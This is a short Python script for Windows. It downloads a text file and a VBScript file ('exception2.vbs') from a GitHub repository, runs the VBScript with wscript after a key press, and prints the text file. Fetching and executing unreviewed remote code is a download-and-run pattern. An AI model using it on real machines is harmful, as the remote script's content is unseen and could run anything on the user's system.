import os
import msvcrt
import time
import urllib.request
from subprocess import run

try:
    os.chdir("cheese")
except:
    os.mkdir("cheese")
    os.chdir("cheese")

try:
    url = "https://raw.githubusercontent.com/poweremojiguy/VisualStudio/main/project%20v9-115/1000.txt"
    filename = urllib.request.urlretrieve(url, filename="1000.txt")

    url = "https://raw.githubusercontent.com/poweremojiguy/VisualStudio/main/project%20v9-115/exception2.vbs"
    filename = urllib.request.urlretrieve(url, filename="exception2.vbs")
except:
    print("Press any key to continue...\n--------------------------------")
    msvcrt.getch()
    time.sleep(1) 
    #V10 through V11.5

    directory = os.getcwd()
    bxvbspath = os.path.join(directory, 'exception2.vbs')
    run(['wscript', bxvbspath])

    os.system("type 1000.txt")
    time.sleep(1)
    print(".")
else:
    print("Press any key to continue...\n--------------------------------")
    msvcrt.getch()
    time.sleep(1) 
    #V10 through V11.5

    directory = os.getcwd()
    bxvbspath = os.path.join(directory, 'exception2.vbs')
    run(['wscript', bxvbspath])

    os.system("type 1000.txt")
    time.sleep(1)
    print(".")